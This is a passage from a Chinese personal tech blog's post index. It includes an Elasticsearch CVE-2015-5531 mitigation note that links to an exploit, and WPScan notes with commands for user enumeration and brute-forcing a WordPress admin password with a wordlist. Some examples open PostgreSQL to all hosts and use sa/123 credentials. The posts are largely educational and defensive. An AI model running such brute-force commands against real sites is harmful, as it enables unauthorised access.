href=\"https://support.dnspod.cn/Kb/showarticle/tsid/28\" target=\"_blank\" rel=\"external\">官方文档</a>。</p>\n<p>然后呢，dnspod域名解析和godaddy上有些不一样，它可以指定国内国外，如下图所示<br><img src=\"https://img.alicdn.com/imgextra/i4/192713264/TB20vIpmVXXXXaHXXXXXXXXXXXX_!!192713264.png\" alt=\" dnspod.png\"><br>将域名设置两个cname，一个指向国内，一个指向国外，就搞定了</p>\n<p>设置好之后我们最好还是要测试下，推荐一个小工具特别好用：MTR</p>\n<p>windows下可以使用<a href=\"https://sourceforge.net/projects/winmtr/\" target=\"_blank\" rel=\"external\">&gt;&gt;这个&lt;&lt;</a></p>\n<p>Linux下安装<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum -y <span class=\"operator\"><span class=\"keyword\">install</span> mtr</span><br><span class=\"line\">apt-<span class=\"keyword\">get</span> <span class=\"keyword\">install</span> mtr-tiny</span></span><br></pre></td></tr></table></figure></p>\n<p>使用方法就不详细说了，直接help查看就知道咋用了。这东西就类似tracert，好不好用，用了就知道。</p>\n"},{"title":"机器学习之瞎BB","url":"http://ohroot.com/2016/04/07/about-machine-learning/","content":"<a id=\"more\"></a>\n<p>最近很苦恼，很苦恼，学习了很多理论知识，然而却感觉并没有神码卵用</p>\n<p>对于一个搞Web安全的，迈不过毕业小论文的坎，更逃不过自己的毕业论文，于是我决定研究下机器学习算法，这是这东西让我感觉苦海无边。</p>\n<p>学习路线还是学习了<a href=\"https://book.douban.com/subject/24703171/\" target=\"_blank\" rel=\"external\"><strong>机器学习实战</strong></a>那本书，通读了分类算法和聚类算法，因为我的一些idea用不到回归方法所以并未去研究（也是因为看不懂，不想看，数学渣，真可怜）</p>\n<p>然后，发现这些算法还是解决不了自己的问题，又在网上找资料看论文，看到了有个层次聚类算法好像可以解决我的问题，可是书上都没提过这个算法，无奈只好网上找资料。逛了一天还是只是了解其原理，又顺便了解了很多知识，例如什么谱聚类，什么DBSCAN，都是大概了解其原理</p>\n<p>无奈想起ourren给我分享过的<a href=\"http://scikit-learn.org/stable/\" target=\"_blank\" rel=\"external\">scikit-learn</a>,据说可以不用太了解具体算法原理也可以解决自己的问题。好吧，听起来正符合我的需求，解决问题！！然后开始阅读文档，才发现算法好多啊，好多啊，好多啊… 英语有点读不懂啊，读不懂啊…</p>\n<p>然而看scikit-learn的文档我还是了解了整个机器学习体系的，就在文档的<a href=\"http://scikit-learn.org/stable/tutorial/basic/tutorial.html\" target=\"_blank\" rel=\"external\">Quick Start</a>页面，机器学习主要分为监督学习和无监督学习。其中监督学习中的训练数据都具有分类标签，它又可分为分类方法和回归方法，其中分类算法就是很常见的，将一些有标签的样本进行训练，然后有未分类的数据，可实现对未分类数据判别分类。而回归方法据说是用于输出是一个或者多个连续的变量。无监督学习是我研究的重点，我的数据都是没有便签的，而聚类方法就是将相似的样本聚成一个样本集形成一个个新的分类。无监督学习也包括聚类、密度估计等多种方法。</p>\n<p>说了这么多，也不能解决我的问题，继续看文档去了，但是我可以感觉到<a href=\"http://scikit-learn.org/stable/modules/clustering.html#hierarchical-clustering\" target=\"_blank\" rel=\"external\">Hierarchical clustering</a>应该可以解决我的问题。看文档去了</p>\n"},{"title":"用PostgreSQL处理数据","url":"http://ohroot.com/2016/04/07/trial-of-postgresql/","content":"<a id=\"more\"></a>\n<p>为什么要用PostgreSQL呢，懂的人自然懂。我们需要把PostgreSQL的SQL文件转换成其他数据库格式，记录下一些姿势</p>\n<p>其实大可不必倒腾这个数据库，直接转换下成csv格式一样可以导入到各种数据库。但是呢，就喜欢折腾</p>\n<p>至于安装方法什么的就不说了实在是简单，由于我只是拿它处理个数据，然后呢，kali里面刚好就有，我们就将就着用吧，</p>\n<h2 id=\"开启外连\">开启外连</h2><ul>\n<li>编辑<code>/etc/postgresql/9.4/main/postgresql.conf</code><ul>\n<li>将<code>#listen_addresses = &#39;localhost&#39;</code>改为<code>listen_addresses = &#39;*&#39;</code></li>\n</ul>\n</li>\n<li>编辑<code>/etc/postgresql/9.4/main/pg_hba.conf</code><ul>\n<li>在文档末尾加上以下内容<code>host all all 0.0.0.0 0.0.0.0 md5</code></li>\n</ul>\n</li>\n<li>重启PostgreSQL数据库</li>\n</ul>\n<h2 id=\"导入数据\">导入数据</h2><p>命令行下执行如下命令，可将相应SQL文件导入到数据库<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psql -h localhost  <span class=\"operator\">-d</span> databaseName  -U username <span class=\"operator\">-f</span>  filename</span><br></pre></td></tr></table></figure></p>\n<p>然后可以使用navicat导出，再用navicat导入到MySQL，大功告成</p>\n"},{"title":"Elasticsearch目录遍历漏洞","url":"http://ohroot.com/2016/03/31/ES-CVE-2015-5531/","content":"<a id=\"more\"></a>\n<p>最近Elasticsearch出现了一个目录遍历漏洞，即CVE-2015-5531，漏洞详情可以查看Freebuf，<a href=\"http://www.freebuf.com/vuls/99942.html\" target=\"_blank\" rel=\"external\">链接在这里</a>我觉得别人讲的挺到位的，我就不去做大自然的搬运工了，问题主要出在对snapshot的路径处理问题上，然后可以查看系统中的文件，不巧我的ES是以root权限运行的，直接<code>/etc/shadow</code>都给列出来了。。。</p>\n<p>其实这个漏洞只要你HTTP RESTful API不对外开放，并没有什么太大的威胁，别人都访问不到何来威胁呢，至少我是这么理解的，于是就开始我的修补之路。</p>\n<p>唉，为了调试方便，集群的机器在内网都是可以访问到的，我心惊胆战，生怕那些不怀好意的小伙伴注意到这个漏洞，然后搞破坏，只好悄悄的修补漏洞。</p>\n<p>首先是非master节点，我直接关闭了http访问，方法：<br>在配置文件中直接写将<code>http.enabled</code>置为<code>false</code><br>但是对于master节点，就恼火了，我试了好几次，先是设置network.host设置成本机，然后发现集群间无法通信了，无奈查看文档好像这个东西不是用来限制访问的。然后又查找资料，找到了<code>http.cors.enabled</code>，关于同源策略相关的设置，设置了半天后来想想同源策略好像不是用来干这事的</p>\n<p>最终，我决定采取简单粗暴的方法，设置iptables，规则如下：</p>\n<figure class=\"highlight r\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-A INPUT -p tcp --dport <span class=\"number\">9200</span>:<span class=\"number\">9400</span> -s <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.1</span>,<span class=\"keyword\">...</span>,<span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.2</span> -j ACCEPT</span><br><span class=\"line\">-A INPUT -p tcp --dport <span class=\"number\">9200</span>:<span class=\"number\">9400</span> -j REJECT</span><br></pre></td></tr></table></figure>\n<p>顺利解决<br>然后附上Freebuf上的那个EXP，那段EXP直接复制下来还有点问题，我修复了相关的字符错误，然后放在了github上，代码很简单，看了代码也就能理解漏洞原理了，这也是备份的原因。地址请<a href=\"https://github.com/lovebed/exps/blob/master/CVE_2015_5531.py\" target=\"_blank\" rel=\"external\">猛戳</a></p>\n"},{"title":"WPScan使用笔记","url":"http://ohroot.com/2016/03/10/wpscan-usage/","content":"<p>这是一款Wordpress的专用扫描器，Wordpress作为三大建站模板之一，在全世界范围内有大量的用户，这也导致白帽子都回去跟踪wordpress的安全漏洞，Wordpress自诞生起也出现了很多漏洞。Wordpress还可以使用插件、主题。于是Wordpress本身很难挖掘什么安全问题的时候，安全研究者开始研究其插件、主题的漏洞。通过插件、主题的漏洞去渗透Wordpress站点，于是WPScan应运而生，收集Wordpress的各种漏洞，形成一个Wordpress专用扫描器。<br><a id=\"more\"></a><br>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。</p>\n<h2 id=\"参数选项\">参数选项</h2><figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-<span class=\"ruby\">-update                           更新数据库</span><br><span class=\"line\"></span>-<span class=\"ruby\">-url       | -u &lt;target url&gt;      配置扫描<span class=\"constant\">URL</span></span><br><span class=\"line\"></span>-<span class=\"ruby\">-force     | -f                   强制让wpscan不要验证目标是否是wordpress</span><br><span class=\"line\"></span>-<span class=\"ruby\">-enumerate | -e [option(s)]       枚举信息</span><br><span class=\"line\"></span>  选项:</span><br><span class=\"line\">    u                              枚举用户名，默认从1-10</span><br><span class=\"line\">    u[10-20]                       枚举用户名，配置从10-20</span><br><span class=\"line\">    p                              枚举插件</span><br><span class=\"line\">    vp                             只枚举有漏洞的插件</span><br><span class=\"line\">    ap                             枚举所有插件，时间较长</span><br><span class=\"line\">    tt                             列举缩略图相关的文件</span><br><span class=\"line\">    t                              枚举主题信息</span><br><span class=\"line\">    vt                             只枚举存在漏洞的主题</span><br><span class=\"line\">    at                             枚举所有主题，时间较长</span><br><span class=\"line\">  可以指定多个扫描选项，例：\"-e tt,p\"</span><br><span class=\"line\">  如果没有指定选项，默认选项为：\"vt,tt,u,vp\"</span><br><span class=\"line\"></span><br><span class=\"line\">-<span class=\"ruby\">-exclude-content-based <span class=\"string\">\"&lt;regexp or string&gt;\"</span></span><br><span class=\"line\"></span>                                   当使用枚举选项时，可以使用该参数做一些过滤，基于正则或者字符串，可以不写正则分隔符，但要用单引号或双引号包裹</span><br><span class=\"line\">-<span class=\"ruby\">-config-file  | -c &lt;config file&gt;   使用指定的配置文件</span><br><span class=\"line\"></span>-<span class=\"ruby\">-user-agent   | -a &lt;<span class=\"constant\">User</span>-<span class=\"constant\">Agent</span>&gt;    指定<span class=\"constant\">User</span>-<span class=\"constant\">Agent</span></span><br><span class=\"line\"></span>-<span class=\"ruby\">-cookie &lt;<span class=\"constant\">String</span>&gt;                   指定cookie</span><br><span class=\"line\"></span>-<span class=\"ruby\">-random-agent | -r                 使用随机<span class=\"constant\">User</span>-<span class=\"constant\">Agent</span></span><br><span class=\"line\"></span>-<span class=\"ruby\">-follow-redirection                如果目标包含一个重定向，则直接跟随跳转</span><br><span class=\"line\"></span>-<span class=\"ruby\">-batch                             无需用户交互，都使用默认行为</span><br><span class=\"line\"></span>-<span class=\"ruby\">-no-color                          不要采用彩色输出</span><br><span class=\"line\"></span>-<span class=\"ruby\">-wp-content-dir &lt;wp content dir&gt;   <span class=\"constant\">WPScan</span>会去发现wp-content目录，用户可手动指定</span><br><span class=\"line\"></span>-<span class=\"ruby\">-wp-plugins-dir &lt;wp plugins dir&gt;   指定wp插件目录，默认是wp-content/plugins</span><br><span class=\"line\"></span>-<span class=\"ruby\">-proxy &lt;[<span class=\"symbol\">protocol:</span>/<span class=\"regexp\">/]host:port&gt;    设置一个代理，可以使用HTTP、SOCKS4、SOCKS4A、SOCKS5，如果未设置默认是HTTP协议</span><br><span class=\"line\"></span></span>-<span class=\"ruby\">-proxy-auth &lt;<span class=\"symbol\">username:</span>password&gt;    设置代理登陆信息</span><br><span class=\"line\"></span>-<span class=\"ruby\">-basic-auth &lt;<span class=\"symbol\">username:</span>password&gt;    设置基础认证信息</span><br><span class=\"line\"></span>-<span class=\"ruby\">-wordlist | -w &lt;wordlist&gt;          指定密码字典</span><br><span class=\"line\"></span>-<span class=\"ruby\">-username | -<span class=\"constant\">U</span> &lt;username&gt;          指定爆破的用户名</span><br><span class=\"line\"></span>-<span class=\"ruby\">-usernames     &lt;path-to-file&gt;      指定爆破用户名字典</span><br><span class=\"line\"></span>-<span class=\"ruby\">-threads  | -t &lt;number of threads&gt; 指定多线程</span><br><span class=\"line\"></span>-<span class=\"ruby\">-cache-ttl       &lt;cache-ttl&gt;       设置 cache <span class=\"constant\">TTL</span>.</span><br><span class=\"line\"></span>-<span class=\"ruby\">-request-timeout &lt;request-timeout&gt; 请求超时时间</span><br><span class=\"line\"></span>-<span class=\"ruby\">-connect-timeout &lt;connect-timeout&gt; 连接超时时间</span><br><span class=\"line\"></span>-<span class=\"ruby\">-max-threads     &lt;max-threads&gt;     最大线程数</span><br><span class=\"line\"></span>-<span class=\"ruby\">-throttle        &lt;milliseconds&gt;    当线程数设置为<span class=\"number\">1</span>时，设置两个请求之间的间隔</span><br><span class=\"line\"></span>-<span class=\"ruby\">-help     | -h                     输出帮助信息</span><br><span class=\"line\"></span>-<span class=\"ruby\">-verbose  | -v                     输出<span class=\"constant\">Verbose</span></span><br><span class=\"line\"></span>-<span class=\"ruby\">-version                           输出当前版本</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"常用选项\">常用选项</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#非入侵式检测</span><br><span class=\"line\">wpscan -u www<span class=\"class\">.example</span><span class=\"class\">.com</span></span><br><span class=\"line\">#默认选项枚举信息</span><br><span class=\"line\">wpscan -u www<span class=\"class\">.example</span><span class=\"class\">.com</span> -e</span><br><span class=\"line\">#枚举插件信息</span><br><span class=\"line\">wpscan -u www<span class=\"class\">.example</span><span class=\"class\">.com</span> -e <span class=\"tag\">p</span></span><br><span class=\"line\">#爆破用户名admin的密码</span><br><span class=\"line\">wpscan -u www<span class=\"class\">.example</span><span class=\"class\">.com</span> --wordlist darkc0de<span class=\"class\">.lst</span> --username admin --threads <span class=\"number\">50</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"安全加固\">安全加固</h2><h3 id=\"如何避免WordPress用户被枚举\">如何避免WordPress用户被枚举</h3><p>枚举用户的原理，<a href=\"http://www.example.com/?author=1，替换后面的数字即可枚举用户\" target=\"_blank\" rel=\"external\">http://www.example.com/?author=1，替换后面的数字即可枚举用户</a><br>如果你想要避免WordPress用户列表被列举，不要把用户名作为昵称，并且不要使用已经被大众知道的用户名。最好的方式是选择一个包含随机字符的名字做用户名并且使用其他名字作为昵称。WPScan扫描URL来获取用户名，所以如果你不使用这个用户名，你肯定不会被WPScan搜索到。</p>\n<h3 id=\"功能如何避免WordPress密码被暴力破解\">功能如何避免WordPress密码被暴力破解</h3><p>最好的方式避免暴力破解就是限制登录次数和IP地址。最新版本的WordPress默认有这个选项。确保你限制输入条目最大为3，增加锁定功能（即6次密码尝试就上锁）。</p>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.freebuf.com/tools/88653.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/tools/88653.html</a></li>\n<li>官网：<a href=\"http://wpscan.org/\" target=\"_blank\" rel=\"external\">http://wpscan.org/</a></li>\n<li>github：<a href=\"https://github.com/wpscanteam/wpscan\" target=\"_blank\" rel=\"external\">https://github.com/wpscanteam/wpscan</a></li>\n</ul>\n"},{"title":"Yii2和sqlserver2014以及oracle的故事","url":"http://ohroot.com/2016/03/05/yii2-mssql-oracle/","content":"<p>没怎么用过SQLSERVER和Oracle，但是又有奇怪的需求要实现在一台电脑上同时安装三种数据库，并查询其中数据，无奈只好倒腾一下<br>由于sqlserver要装在windows机器上，所以我打算把这三个系统都装在server2008上，装起来感觉也简单点。</p>\n<a id=\"more\"></a>\n<h2 id=\"SQLSERVER\">SQLSERVER</h2><p>sqlserver相对我还倒腾的多一点，那么就先从sqlserver讲起，sqlserver我安装的sqlserver2014 Express版本，好像这个版本是免费的，下了一个，然后就是一路默认安装，完了发现连个管理工具都没有，于是又装了个navicat，用navicat去连接sqlserver的时候，发现连接不了，错误提示为什么管道什么的没打开，直觉告诉我一定是哪里需要配置下开启sqlserver外连</p>\n<p>找了一下安装产生的各种工具，发现开始菜单里面有一个配置工具，目录里面有一个SQL Server 2014配置管理器，点进去有一个SQL Server网络配置，然后点进去把Named Pipes和TCP/IP两个都启用，再次用navicat连接，就成功了。</p>\n<p>然后还要开启防火墙允许对SQL Server的访问，这个方法官网就有，<a href=\"https://msdn.microsoft.com/zh-cn/library/ms175043(v=sql.120\" target=\"_blank\" rel=\"external\">链接在此</a>.aspx)</p>\n<p>下面就开始倒腾php查询mssql，然后打算用yii2做点测试</p>\n<h3 id=\"PHP_with_sqlserver\">PHP with sqlserver</h3><p>我在Yii2的数据库配置页看到了下面针对SQLServer的三种配置，也不知道哪个好，只有一个一个了解下了<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//<span class=\"string\">'dsn'</span> =&gt; <span class=\"string\">'sqlsrv:Server=localhost;Database=mydatabase'</span>, // MS SQL Server, sqlsrv driver</span><br><span class=\"line\">//<span class=\"string\">'dsn'</span> =&gt; <span class=\"string\">'dblib:host=localhost;dbname=mydatabase'</span>, // MS SQL Server, dblib driver</span><br><span class=\"line\">//<span class=\"string\">'dsn'</span> =&gt; <span class=\"string\">'mssql:host=localhost;dbname=mydatabase'</span>, // MS SQL Server, mssql driver</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>sqlsrv php的介绍如下<a href=\"http://php.net/manual/zh/book.sqlsrv.php，看了一下他主要用于windows平台。\" target=\"_blank\" rel=\"external\">http://php.net/manual/zh/book.sqlsrv.php，看了一下他主要用于windows平台。</a></li>\n<li>dblib 这个好像可以支持linux，要安装FreeTDS,windows版本已经弃用了。</li>\n<li>mssql driver 这个确实不知道是指的什么</li>\n</ul>\n<p>查阅资料的过程中发现这个网站介绍挺好的-&gt;<a href=\"http://propelorm.org/Propel/cookbook/using-mssql-server.html\" target=\"_blank\" rel=\"external\">地址</a></p>\n<p>上面的第一个windows下的一个驱动，我倒腾了好久都没成功，十分受伤，刚开始是自己的wamp中的php版本过低，没有支持的相应的sqlsrv的dll文件，然后我又把我的wamp升级到最新，配置相应的dll然后查看phpinfo，phpinfo中没有丝毫反映，网上还说啥只支持32位php，不支持64位的，倒腾好久放弃，试试别的方案。</p>\n<p>第二个驱动支持linux，而我又比较喜欢在linux下开发，我们需要安装FreeTDS，网上看了很多，基本说的要装的如下：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get <span class=\"operator\"><span class=\"keyword\">install</span> php5-sybase php5-odbc unixodbc tdsodbc freetds-common freetds-<span class=\"keyword\">bin</span></span></span><br></pre></td></tr></table></figure></p>\n<p>安装完成后可运行命令查看FreeTDS安装状况</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tsql -<span class=\"keyword\">H</span> 192.168.32.77 -p 1433 -<span class=\"keyword\">U</span> <span class=\"keyword\">sa</span> -<span class=\"keyword\">D</span> <span class=\"keyword\">test</span>   #测试连接</span><br><span class=\"line\">tsql -C  #查看配置</span><br></pre></td></tr></table></figure>\n<p>修改配置文件，我用的是xampp，路径为：<code>/opt/lampp/etc/freetds.conf</code>，默认路径是<code>/etc/freetds/freetds.conf</code><br>添加配置<br><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mymssql]</span><br><span class=\"line\">        <span class=\"variable\">host =</span> <span class=\"number\">192.168</span>.<span class=\"number\">32.77</span></span><br><span class=\"line\">        <span class=\"variable\">port =</span> <span class=\"number\">1433</span></span><br><span class=\"line\">        tds <span class=\"variable\">version =</span> <span class=\"number\">7.0</span></span><br></pre></td></tr></table></figure></p>\n<p>然后测试代码如下，测试成功。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"preprocessor\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$server</span> = <span class=\"string\">'mymssql'</span>;</span><br><span class=\"line\">  <span class=\"variable\">$username</span> = <span class=\"string\">'sa'</span>;</span><br><span class=\"line\">  <span class=\"variable\">$password</span> = <span class=\"string\">'123'</span>;</span><br><span class=\"line\">  <span class=\"variable\">$database</span> = <span class=\"string\">'test'</span>;</span><br><span class=\"line\">  <span class=\"variable\">$connection</span> = mssql_connect(<span class=\"variable\">$server</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"variable\">$connection</span> != <span class=\"keyword\">FALSE</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Connected to the database server OK&lt;br /&gt;\"</span>;</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"Couldn't connect\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(mssql_select_db(<span class=\"variable\">$database</span>, <span class=\"variable\">$connection</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Selected $database ok&lt;br /&gt;\"</span>;</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Failed to select DB'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$query_result</span> = mssql_query(<span class=\"string\">'SELECT @@VERSION'</span>);</span><br><span class=\"line\">  <span class=\"variable\">$row</span> = mssql_fetch_array(<span class=\"variable\">$query_result</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"variable\">$row</span> != <span class=\"keyword\">FALSE</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Version is &#123;$row[0]&#125;&lt;br /&gt;\"</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  mssql_free_result(<span class=\"variable\">$query_result</span>);</span><br><span class=\"line\">  mssql_close(<span class=\"variable\">$connection</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"preprocessor\">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>\n<p>实际测试时，我发现只要安装<code>php5-sybase</code>和<code>freetds-bin</code>就可以连接了。<br>我先在自己的笔记本上倒腾，笔记本用的XAMPP，怎么装上面那段测试代码可以连接mssql，但是phpinfo里面就是没有pdo<em>dblib，然后我重新装了虚拟机，不用套件，一个个装apache2、mysql、php。装好之后又安装<code>php5-sybase</code>和<code>freetds-bin</code>。然后神奇的事情发生了，全都好了。截图如下，如果你装好后，<code>phpinfo()</code>中也包含这些内容就说明成功了<br>&lt;img src=”<a href=\"https://img.alicdn.com/imgextra/i1/192713264/TB2Hx2KkVXXXXamXXXXXXXXXXXX\" target=\"_blank\" rel=\"external\">https://img.alicdn.com/imgextra/i1/192713264/TB2Hx2KkVXXXXamXXXXXXXXXXXX</a></em>!!192713264.png” alt=” mssql.png”/&gt;<br><img src=\"https://img.alicdn.com/imgextra/i1/192713264/TB2t9PwkVXXXXb_XXXXXXXXXXXX_!!192713264.png\" alt=\" pdo.png\"></p>\n<p>下面使用PDO方式的连接，我们最终目标是使用YII2框架嘛，直接给出测试代码：<br>数据库配置：<br><figure class=\"highlight dart\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'msdb'</span> =&gt; [</span><br><span class=\"line\">    <span class=\"string\">'class'</span> =&gt; <span class=\"string\">'yii\\db\\Connection'</span>,</span><br><span class=\"line\">    <span class=\"string\">'dsn'</span> =&gt; <span class=\"string\">'dblib:host=192.168.32.77:1433;dbname=test'</span>,</span><br><span class=\"line\">    <span class=\"string\">'username'</span> =&gt; <span class=\"string\">'sa'</span>,</span><br><span class=\"line\">    <span class=\"string\">'password'</span> =&gt; <span class=\"string\">'123'</span>,</span><br><span class=\"line\">    <span class=\"string\">'charset'</span> =&gt; <span class=\"string\">'utf8'</span>,</span><br><span class=\"line\">],</span><br></pre></td></tr></table></figure></p>\n<p>测试代码：<br><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$connection</span> = \\<span class=\"constant\">Yii:</span><span class=\"symbol\">:</span><span class=\"variable\">$app</span>-&gt;msdb;</span><br><span class=\"line\"><span class=\"variable\">$connection</span>-&gt;open();</span><br><span class=\"line\"><span class=\"variable\">$command</span> = <span class=\"variable\">$connection</span>-&gt;createCommand(<span class=\"string\">'SELECT * FROM testtable'</span>);</span><br><span class=\"line\"><span class=\"variable\">$posts</span> = <span class=\"variable\">$command</span>-&gt;queryAll();</span><br><span class=\"line\">var_dump(<span class=\"variable\">$posts</span>);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Oracle\">Oracle</h2><p>oracle的下载页面-&gt;<a href=\"http://www.oracle.com/technetwork/cn/database/enterprise-edition/downloads/index.html\" target=\"_blank\" rel=\"external\">请猛戳</a>，我下载的版本是11g第二版</p>\n<p>同样的我们需要配置才能用php连接，并操作。我们需要下载配置oracle instant client来连接，下载地址：<a href=\"http://www.oracle.com/technetwork/cn/database/features/instant-client/index-092537-zhs.html\" target=\"_blank\" rel=\"external\">Oracle Database Instant Client</a><br>下载对应版本的instantclient，有两个文件，一个是basic包，一个是SDK包，我下的文件名分别是：instantclient-basic-linux.x64-12.1.0.2.0.zip，instantclient-sdk-linux.x64-12.1.0.2.0.zip。如果你是centos系统，也可以直接下载相应的rpm包直接安装。rpm安装的路径为：<br><code>/usr/lib/oracle/12.1/client64/lib/</code>，我们也将上面两个文件在相同目录下解压，SDK压缩包的内容或解压到basic的子目录下，我们把解压的内容复制到上面的目录中，rpm安装，还会把一些头文件放置到<code>/usr/include/oracle/12.1/client64/</code>中，我们也把sdk下面的子目录里面的头文件拷贝到对应的目录，至此instantclient就安装完成了。</p>\n<h3 id=\"Oracle_使用\">Oracle 使用</h3><p>Oracle还是有点复杂，这里简单写几个SQL语句，备忘<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\"><span class=\"keyword\">alter</span> <span class=\"keyword\">user</span> scott account <span class=\"keyword\">lock</span>;</span></span><br><span class=\"line\"><span class=\"operator\"><span class=\"keyword\">alter</span> <span class=\"keyword\">user</span> scott account <span class=\"keyword\">unlock</span>;</span></span><br><span class=\"line\"><span class=\"operator\"><span class=\"keyword\">alter</span> <span class=\"keyword\">user</span> scott <span class=\"keyword\">identified</span> <span class=\"keyword\">by</span> grace;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"PHP_with_Oracle\">PHP with 